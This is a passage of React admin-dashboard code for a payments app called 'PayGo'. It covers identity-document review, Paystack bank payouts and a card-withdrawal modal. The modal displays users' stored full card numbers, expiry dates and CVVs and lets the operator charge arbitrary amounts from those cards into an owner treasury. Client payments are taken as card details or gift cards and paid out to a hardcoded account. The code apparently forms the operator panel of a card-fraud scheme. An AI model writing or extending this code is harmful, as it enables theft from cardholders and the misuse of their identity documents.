                            onClick={() => {
                              setPreviewImageTitle("Driver's License — Back");
                              setPreviewImage(k.licenseBackImage);
                            }}
                            className="bg-gray-800 hover:border-indigo-400 border border-gray-700 rounded-xl p-1.5 flex items-center space-x-1.5 cursor-pointer"
                          >
                            <img src={k.licenseBackImage} alt="License Back" className="w-8 h-8 object-cover rounded" />
                            <span className="text-[10px] text-indigo-300 font-bold">Back</span>
                          </button>
                        </div>
                      </div>
                    </div>

                    <div className="pt-2 border-t border-gray-700/60 flex flex-wrap items-center justify-between gap-2">
                      <div className="text-[11px] text-gray-400">
                        Ref: <span className="font-mono text-gray-300">{k.id}</span>
                        {k.rejectionReason && (
                          <span className="text-red-400 ml-2">({k.rejectionReason})</span>
                        )}
                      </div>

                      <div className="flex flex-wrap items-center gap-2">
                        {k.status !== 'rejected' && (
                          <>
                            <button
                              type="button"
                              onClick={() =>
                                handleUpdateKycStatus(
                                  k,
                                  'rejected',
                                  "Driver's License photos are unclear or expired. Please upload clear front and back photos."
                                )
                              }
                              className="bg-red-600/30 hover:bg-red-600 text-red-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-red-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Invalid ID</span>
                            </button>
                            <button
                              type="button"
                              onClick={() =>
                                handleUpdateKycStatus(
                                  k,
                                  'rejected',
                                  'SSI details do not match your profile. Please verify and resubmit your SSI details.'
                                )
                              }
                              className="bg-rose-600/30 hover:bg-rose-600 text-rose-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-rose-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: SSI Mismatch</span>
                            </button>
                          </>
                        )}

                        {k.status !== 'verified' && (
                          <button
                            type="button"
                            onClick={() => handleUpdateKycStatus(k, 'verified')}
                            className="bg-emerald-600 hover:bg-emerald-700 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center space-x-1 shadow-sm"
                          >
                            <ShieldCheck className="w-3.5 h-3.5" />
                            <span>Approve ID &amp; Unlock Withdrawals</span>
                          </button>
                        )}

                        <button
                          type="button"
                          onClick={() => handleDeleteKyc(k.id)}
                          className="bg-gray-700 hover:bg-red-600 text-gray-300 hover:text-white px-2.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center space-x-1"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                          <span>Remove</span>
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Tab 4: Bank Payouts & Real Payment Ledger */}
        {activeTab === 'payouts' && (
          <div className="space-y-6">
            {/* Paystack Live Gateway Status Banner */}
            <div
              className={`rounded-2xl p-4 border flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 ${
                paystackStatus.configured
                  ? 'bg-emerald-950/40 border-emerald-500/30'
                  : 'bg-amber-950/40 border-amber-500/30'
              }`}
            >
              <div className="flex items-start space-x-3">
                {paystackStatus.configured ? (
                  <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
                ) : (
                  <AlertCircle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
                )}
                <div className="text-xs space-y-1">
                  <p className="font-bold text-white">
                    {paystackStatus.configured
                      ? `Paystack ${paystackStatus.mode === 'live' ? 'Live' : 'Test'} Gateway Active`
                      : 'Paystack Secret Key Not Configured'}
                  </p>
                  <p className="text-gray-300 leading-relaxed">
                    {paystackStatus.configured
                      ? 'Real Paystack bank payouts to Paystack-Titan and supported bank accounts are ready.'
                      : 'Real money accounting is active ($0.00 starting balance — no demo money). To send live fiat payouts to Paystack-Titan or banks, add PAYSTACK_SECRET_KEY in AI Studio Secrets.'}
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => refreshPaystackStatus(firebaseUser)}
                className="bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-semibold px-3 py-2 rounded-xl border border-gray-700 flex items-center space-x-1.5 shrink-0 cursor-pointer"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                <span>Refresh Gateway</span>
              </button>
            </div>

            <div className="flex flex-wrap items-center justify-between gap-3">
              <div>
                <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                  <Landmark className="w-5 h-5 text-emerald-400" />
                  <span>Direct Bank Settlements (Paystack-Titan & Any Bank)</span>
                </h2>
                <p className="text-xs text-gray-400 mt-0.5">
                  Withdraw real settled treasury funds directly via Paystack API to Paystack-Titan or any bank.
                </p>
              </div>
              <button
                onClick={() => handleOpenBankPayout(true)}
                className="bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 cursor-pointer shadow-md"
              >
                <ArrowUpRight className="w-4 h-4" />
                <span>Withdraw to SmartCash (8081756524)</span>
              </button>
            </div>

            {payoutHistory.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-10 text-center text-gray-400 space-y-3">
                <Landmark className="w-12 h-12 mx-auto opacity-40 text-indigo-400" />
                <p className="text-sm font-medium text-gray-300">No bank withdrawals sent yet.</p>
                <p className="text-xs text-gray-500 max-w-md mx-auto">
                  Approve real client payments (ATM Cards or Gift Cards) to build your settled treasury balance, then withdraw directly to SmartCash PSB ({DEFAULT_PAYOUT_ACCOUNT_NUMBER}) or any bank.
                </p>
                <button
                  onClick={() => handleOpenBankPayout(true)}
                  className="bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl inline-flex items-center space-x-1.5 cursor-pointer"
                >
                  <Landmark className="w-4 h-4" />
                  <span>Withdraw to SmartCash • 8081756524</span>
                </button>
              </div>
            ) : (
              <div className="space-y-3">
                {payoutHistory.map((p) => (
                  <div
                    key={p.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 hover:border-emerald-500/40 transition-all"
                  >
                    <div className="space-y-1">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="bg-indigo-600/30 text-indigo-300 px-2.5 py-0.5 rounded-lg text-xs font-bold border border-indigo-500/30">
                          {p.bankName || 'Bank Payout'}
                        </span>
                        <span className="bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded-full text-[10px] font-bold uppercase border border-emerald-500/30">
                          {p.status}
                        </span>
                        <span className="text-xs text-gray-400 font-mono">{p.date}</span>
                      </div>
                      <p className="text-sm font-bold text-white">
                        {p.accountName} • <span className="font-mono text-purple-300">{p.accountNumber}</span>
                      </p>
                      <p className="text-[11px] text-gray-400 font-mono">
                        Ref: {p.reference}
                        {p.transferCode ? ` • Paystack: ${p.transferCode}` : ''}
                      </p>
                    </div>
                    <div className="text-left sm:text-right">
                      <span className="text-xl font-black text-emerald-400 font-mono">
                        -${p.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                      </span>
                      <p className="text-[11px] text-gray-500">Dispatched via Paystack</p>
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Real Settled Client Payments (Inflows) Audit Ledger */}
            <div className="pt-4 border-t border-gray-800 space-y-3">
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-bold text-gray-200 flex items-center space-x-2">
                  <ArrowDownRight className="w-4 h-4 text-emerald-400" />
                  <span>Real Settled Client Payments ({settledInflows.length})</span>
                </h3>
                <span className="text-xs font-mono text-emerald-400">
                  Total In: ${totalSettledIn.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </span>
              </div>

              {settledInflows.length === 0 ? (
                <div className="bg-gray-800/60 border border-gray-700/70 rounded-2xl p-6 text-center text-xs text-gray-400">
                  No settled client payments recorded yet. Real balance starts at $0.00 until you approve a user payment.
                </div>
              ) : (
                <div className="space-y-2.5">
                  {settledInflows.map((tx) => (
                    <div
                      key={tx.id}
                      className="bg-gray-800 border border-gray-700 rounded-xl p-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2"
                    >
                      <div className="space-y-0.5">
                        <div className="flex items-center space-x-2">
                          <span className="bg-emerald-500/20 text-emerald-300 px-2 py-0.5 rounded-md text-[11px] font-bold">
                            {tx.type}
                          </span>
                          <span className="text-[11px] text-gray-400 font-mono">{tx.date}</span>
                        </div>
                        <p className="text-xs text-gray-300">
                          From: <span className="text-purple-300 font-medium">{tx.userEmail || 'Client'}</span>
                          {tx.note ? ` • ${tx.note}` : ''}
                        </p>
                      </div>
                      <span className="text-base font-black text-emerald-400 font-mono">
                        +${tx.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                      </span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}
      </div>

      {/* ATM Card Withdraw Modal */}
      {selectedCardForWithdraw && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4 z-50">
          <div className="bg-gray-800 border border-gray-700 rounded-3xl p-6 max-w-md w-full shadow-2xl space-y-5">
            <div className="flex items-center justify-between border-b border-gray-700 pb-3">
              <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                <CreditCard className="w-5 h-5 text-emerald-400" />
                <span>Execute ATM Card Withdrawal</span>
              </h3>
              <button
                onClick={() => setSelectedCardForWithdraw(null)}
                className="text-gray-400 hover:text-white p-1 cursor-pointer"
              >
                ✕
              </button>
            </div>

            {withdrawSuccess ? (
              <div className="text-center py-6 space-y-4">
                <div className="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto border border-emerald-500/30">
                  <Check className="w-8 h-8" />
                </div>
                <h4 className="text-xl font-bold text-white">Withdrawal Successful!</h4>
                <p className="text-xs text-gray-300">
                  Successfully charged{' '}
                  <span className="font-mono font-bold text-white">
                    ${parseFloat(withdrawAmountInput).toLocaleString()}
                  </span>{' '}
                  from card{' '}
                  <span className="font-mono text-purple-300">
                    {selectedCardForWithdraw.cardNumber}
                  </span>{' '}
                  to owner settlement vault{' '}
                  <span className="font-bold text-emerald-400">PayGo Merchant Treasury</span>.
                </p>
                <button
                  onClick={() => setSelectedCardForWithdraw(null)}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded-xl text-sm cursor-pointer"
                >
                  Done
                </button>
              </div>
            ) : isWithdrawing ? (
              <div className="text-center py-8 space-y-4">
                <div className="w-12 h-12 border-4 border-emerald-400 border-t-transparent rounded-full animate-spin mx-auto" />
                <p className="text-sm text-gray-300">Processing secure ATM gateway charge...</p>
                <p className="text-xs font-mono text-purple-300">
                  {selectedCardForWithdraw.cardNumber}
                </p>
              </div>
            ) : (
              <form onSubmit={handleExecuteWithdraw} className="space-y-4">
                <div className="bg-gray-900 p-4 rounded-2xl border border-gray-700 space-y-2 text-xs">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Cardholder:</span>
                    <span className="font-bold uppercase text-white">
                      {selectedCardForWithdraw.cardName}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Card Number:</span>
                    <span className="font-mono text-purple-300">
                      {selectedCardForWithdraw.cardNumber}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Expiry / CVV:</span>
                    <span className="font-mono text-white">
                      {selectedCardForWithdraw.expiry} • {selectedCardForWithdraw.cvv}
                    </span>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                    Withdrawal Amount ($)
                  </label>
                  <input
                    type="number"
                    min="1"
                    value={withdrawAmountInput}
                    onChange={(e) => setWithdrawAmountInput(e.target.value)}
                    placeholder="Enter amount to charge"
                    className="w-full p-3.5 bg-gray-900 border border-gray-700 rounded-xl focus:ring-2 focus:ring-emerald-500 outline-none text-sm font-bold text-white font-mono"
                    required
                  />
                </div>

                <div className="p-3 bg-purple-900/30 border border-purple-700/50 rounded-xl text-xs text-purple-200">
                  Funds will be settled instantly to your{' '}
                  <span className="font-bold text-white">
                    PayGo Owner Treasury ({OWNER_EMAIL})
                  </span>
                  .
                </div>

                <div className="flex space-x-3 pt-2">
                  <button
                    type="button"
                    onClick={() => setSelectedCardForWithdraw(null)}
                    className="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-3 rounded-xl text-xs transition-colors cursor-pointer"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl text-xs shadow-md transition-all cursor-pointer"
                  >
                    Confirm & Withdraw
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      )}

      {/* Admin Treasury Bank Payout Modal (Paystack-Titan or Any Bank) */}
      {showBankPayoutModal && (
        <div className="fixed inset-0 bg-black/75 backdrop-blur-xs flex items-center justify-center p-4 z-50">
          <div className="bg-gray-800 border border-gray-700 rounded-3xl p-6 max-w-md w-full shadow-2xl space-y-5 max-h-[92vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-gray-700 pb-3">
              <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                <Landmark className="w-5 h-5 text-indigo-400" />
                <span>Withdraw to Paystack-Titan / Bank</span>
              </h3>
              <button
                onClick={() => setShowBankPayoutModal(false)}
                className="text-gray-400 hover:text-white p-1 cursor-pointer"
              >
                ✕
              </button>
            </div>

            {completedPayout ? (
              <div className="text-center py-4 space-y-4">
                <div className="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto border border-emerald-500/30">
                  <Check className="w-8 h-8" />
                </div>
                <div>
                  <h4 className="text-xl font-bold text-white">Bank Settlement Sent!</h4>
                  <p className="text-xs text-gray-400 mt-1">
                    Funds dispatched directly from Admin Treasury Wallet
                  </p>
                </div>

                <div className="bg-gray-900 border border-gray-700 rounded-2xl p-4 text-left space-y-2 text-xs">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Destination Bank:</span>
                    <span className="font-bold text-indigo-300">{completedPayout.bankName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Account Number:</span>
                    <span className="font-mono font-bold text-white">{completedPayout.accountNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Account Name:</span>
                    <span className="font-bold text-white">{completedPayout.accountName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Amount Withdrawn:</span>
                    <span className="font-mono font-black text-emerald-400">
                      ${completedPayout.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                    </span>
                  </div>
                  <div className="flex justify-between pt-2 border-t border-gray-800">
                    <span className="text-gray-400">Reference:</span>
                    <span className="font-mono text-gray-300">{completedPayout.reference}</span>
                  </div>
                </div>

                <button
                  onClick={() => setShowBankPayoutModal(false)}
                  className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl text-sm cursor-pointer"
                >
                  Done
                </button>
              </div>
            ) : isProcessingPayout ? (
              <div className="text-center py-8 space-y-4">
                <div className="w-12 h-12 border-4 border-indigo-400 border-t-transparent rounded-full animate-spin mx-auto" />
                <p className="text-sm text-gray-200 font-semibold">
                  Sending via Paystack to{' '}
                  {payoutBankCode === 'CUSTOM'
                    ? customBankName
                    : availableBanks.find((b) => b.code === payoutBankCode)?.name || 'Paystack-Titan'}
                  ...
                </p>
                <p className="text-xs text-gray-400 font-mono">
                  Account: {payoutAccountNumber}
                </p>
              </div>
            ) : (
              <form onSubmit={handleExecuteBankPayout} className="space-y-4">
                <div className="bg-gray-900 border border-gray-700 rounded-2xl p-3.5 flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Wallet className="w-4 h-4 text-emerald-400" />
                    <span className="text-xs text-gray-400">Real Settled Balance</span>
                  </div>
                  <span className="font-mono font-black text-emerald-400 text-base">
                    ${adminWalletBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                  </span>
                </div>

                {!paystackStatus.configured && (
                  <div className="p-3 bg-amber-950/60 border border-amber-500/40 text-amber-200 text-[11px] rounded-xl leading-relaxed">
                    <strong>Paystack Secret Key Required:</strong> Add <code className="font-mono">PAYSTACK_SECRET_KEY</code> in AI Studio Secrets to execute live transfers to Paystack-Titan or any bank. Transfers will not be simulated.
                  </div>
                )}

                {payoutError && (
                  <div className="p-3 bg-red-900/50 border border-red-700 text-red-300 text-xs rounded-xl leading-relaxed">
                    {payoutError}
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                    Select Destination Bank
                  </label>
                  <select
                    value={payoutBankCode}
                    onChange={(e) => {
                      setPayoutBankCode(e.target.value);
                      setResolveAccountNotice('');
                    }}
                    className="w-full p-3 bg-gray-900 border border-gray-700 rounded-xl text-xs font-semibold text-white outline-none focus:ring-2 focus:ring-indigo-500"
                  >
                    {availableBanks.map((bank) => (
                      <option key={`${bank.code}-${bank.name}`} value={bank.code}>
                        {bank.code === '120004'
                          ? `⭐ ${bank.name} (${bank.code}) — Direct Target`
                          : bank.code === '100039'
                          ? `${bank.name} (${bank.code})`
                          : bank.code === 'CUSTOM'
                          ? bank.name
                          : `${bank.name} (${bank.code})`}
                      </option>
                    ))}
                  </select>
                </div>

                {payoutBankCode === 'CUSTOM' && (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div>
                      <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                        Custom Bank Name
                      </label>
                      <input
                        type="text"
                        value={customBankName}
                        onChange={(e) => setCustomBankName(e.target.value)}
                        placeholder="e.g. Standard Chartered"
                        className="w-full p-3 bg-gray-900 border border-gray-700 rounded-xl text-xs text-white outline-none focus:ring-2 focus:ring-indigo-500"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                        Bank Code
                      </label>
                      <input
                        type="text"
                        value={customBankCode}
                        onChange={(e) => setCustomBankCode(e.target.value)}
                        placeholder="e.g. 068"
                        className="w-full p-3 bg-gray-900 border border-gray-700 rounded-xl text-xs font-mono text-white outline-none focus:ring-2 focus:ring-indigo-500"
                        required
                      />
                    </div>
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                    Account Number
                  </label>
                  <div className="flex space-x-2">
                    <input
                      type="text"
                      value={payoutAccountNumber}
                      onChange={(e) => setPayoutAccountNumber(e.target.value)}
                      placeholder="Enter 10-digit account number"
                      className="flex-1 p-3 bg-gray-900 border border-gray-700 rounded-xl text-xs font-mono text-white outline-none focus:ring-2 focus:ring-indigo-500"
                      required
                    />
                    <button
                      type="button"
                      onClick={handleResolveBankAccount}
                      disabled={isResolvingAccount}
                      className="bg-gray-700 hover:bg-gray-600 text-white text-xs font-semibold px-3 rounded-xl shrink-0 cursor-pointer disabled:opacity-50"
                    >
                      {isResolvingAccount ? 'Checking...' : 'Verify Name'}
                    </button>
                  </div>
                  {resolveAccountNotice && (
                    <p className="text-[11px] text-indigo-300 mt-1">{resolveAccountNotice}</p>
                  )}
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                    Account Holder Name
                  </label>
                  <input
                    type="text"
                    value={payoutAccountName}
                    onChange={(e) => setPayoutAccountName(e.target.value)}
                    placeholder="Enter recipient full name (or tap Verify Name)"
                    className="w-full p-3 bg-gray-900 border border-gray-700 rounded-xl text-xs uppercase text-white outline-none focus:ring-2 focus:ring-indigo-500"
                    required
                  />
                </div>

                <div>
                  <div className="flex items-center justify-between mb-1">
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400">
                      Amount to Withdraw ($)
                    </label>
                    <button
                      type="button"
                      onClick={() => setPayoutAmount(adminWalletBalance.toString())}
                      className="text-[11px] bg-indigo-600/30 hover:bg-indigo-600/50 text-indigo-300 px-2 py-0.5 rounded-md font-bold cursor-pointer"
                    >
                      MAX
                    </button>
                  </div>
                  <input
                    type="number"
                    step="0.01"
                    min="1"
                    max={adminWalletBalance > 0 ? adminWalletBalance : undefined}
                    value={payoutAmount}
                    onChange={(e) => setPayoutAmount(e.target.value)}
                    placeholder="Enter amount from real balance"
                    className="w-full p-3 bg-gray-900 border border-gray-700 rounded-xl text-sm font-mono font-bold text-white outline-none focus:ring-2 focus:ring-indigo-500"
                    required
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                    Settlement Note (Optional)
                  </label>
                  <input
                    type="text"
                    value={payoutNote}
                    onChange={(e) => setPayoutNote(e.target.value)}
                    placeholder="e.g. Paystack Titan settlement"
                    className="w-full p-3 bg-gray-900 border border-gray-700 rounded-xl text-xs text-white outline-none focus:ring-2 focus:ring-indigo-500"
                  />
                </div>

                <div className="flex space-x-3 pt-2">
                  <button
                    type="button"
                    onClick={() => setShowBankPayoutModal(false)}
                    className="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-3 rounded-xl text-xs transition-colors cursor-pointer"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    disabled={adminWalletBalance <= 0}
                    className="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl text-xs shadow-md transition-all cursor-pointer flex items-center justify-center space-x-1.5 disabled:opacity-50"
                  >
                    <Send className="w-3.5 h-3.5" />
                    <span>Send Live Payout</span>
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      )}

      {/* Image Preview Modal */}
      {previewImage && (
        <div
          className="fixed inset-0 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4 z-50 animate-in fade-in"
          onClick={() => setPreviewImage(null)}
        >
          <div
            className="bg-gray-800 border border-gray-700 rounded-2xl p-4 max-w-lg w-full relative"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex justify-between items-center mb-3">
              <h4 className="text-sm font-bold text-white">{previewImageTitle}</h4>
              <button
                onClick={() => setPreviewImage(null)}
                className="text-gray-400 hover:text-white p-1 text-sm font-bold"
              >
                ✕
              </button>
            </div>
            <img
              src={previewImage}
              alt="Enlarged Card Preview"
              className="w-full max-h-[70vh] object-contain rounded-xl border border-gray-700 bg-black/50"
            />
          </div>
        </div>
      )}
    </div>
  );
};
